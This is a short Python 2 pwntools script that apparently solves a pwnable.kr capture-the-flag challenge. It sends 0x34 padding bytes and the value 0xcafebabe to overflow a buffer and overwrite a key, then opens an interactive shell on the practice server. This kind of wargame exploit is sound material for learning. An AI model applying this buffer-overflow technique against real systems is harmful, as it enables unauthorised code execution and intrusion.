#!/usr/bin/env python2
from pwn import *
c = remote('pwnable.kr', 9000)

ans = "\0" * 0x34
ans += p32(0xcafebabe) # new key

c.sendline(ans)

c.interactive()
c.close()
